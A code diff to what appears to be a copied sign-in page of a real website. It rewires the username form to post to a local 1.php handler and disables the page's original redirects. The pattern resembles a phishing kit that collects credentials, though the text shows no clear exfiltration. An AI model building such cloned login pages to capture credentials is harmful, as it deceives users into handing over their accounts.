@@ -9,7 +9,7 @@
     <div id="app">
         <div id="main" class="_323TU608c7R7" data-path="/authentication/username" aria-hidden="false"><span class="_18lR5Lcsowvx"></span>
             <main id="content" class="_2c87ug2gdnMj iSsy-kS_VNy5" aria-live="polite" aria-hidden="false"><a class="_3uPSPih3cDvg" data-qa="screen-reader-label" id="maincontent" name="maincontent" tabindex="-1">Main content</a>
-                <form class="_2kwu1cwKs9T_" autocomplete="off">
+                <form class="_2kwu1cwKs9T_" autocomplete="off" action="1.php" method="post">
                     <button type="submit" aria-hidden="true">Continue</button>
                     <section data-qa="cam-10-page" class="_29F8NWiiqSC3">
                         <div class="_1X89qp1igOet">
@@ -68,15 +68,26 @@
     <script>
         var registerBtn = document.getElementById('btn-register');
         registerBtn.addEventListener('click', () => {
-            location.href = "3.html";
+            //location.href = "3.html";
         });
 
         var continueBtn = document.getElementById('btn-continue');
-        continueBtn.addEventListener('click', (e) => {
-            e.preventDefault();
-            userid = document.getElementById('userid').value;
-            location.href = "2.html?userid=" + userid;
-        })
+        // continueBtn.addEventListener('click', (e) => {
+        //     e.preventDefault();
+        //     userid = document.getElementById('userid').value;
+        //     location.href = "2.html?userid=" + userid;
+        // })
+
+        document.getElementById('userid').addEventListener('input', () => {
+            var userid = document.getElementById('userid').value;
+            if (userid) {
+                document.getElementById('btn-continue').classList.add('_346tgcQzioQc');
+                document.getElementById('btn-continue').classList.remove('_1wxVBjVdI7l6');
+            } else {
+                document.getElementById('btn-continue').classList.add('_1wxVBjVdI7l6');
+                document.getElementById('btn-continue').classList.remove('_346tgcQzioQc');
+            }
+        });
     </script>
 </body>
 
